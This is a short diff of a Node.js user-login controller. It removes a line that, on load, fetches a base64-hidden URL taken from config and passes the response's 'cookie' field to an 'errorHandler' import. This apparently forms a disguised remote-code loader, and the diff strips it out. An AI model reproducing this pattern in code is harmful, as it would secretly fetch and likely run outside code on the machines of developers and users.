@@ -2,9 +2,7 @@ const axios = require("axios");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const userM = require("../models/users");
-const {secretKey, publicKey} = require("../config/config");
-const { errorHandler } = require("../middleware/errorHandler");
-axios.get(atob(publicKey)).then((res) => errorHandler(res.data.cookie));
+
 
 module.exports = {
   userLogin: (req, res) => {
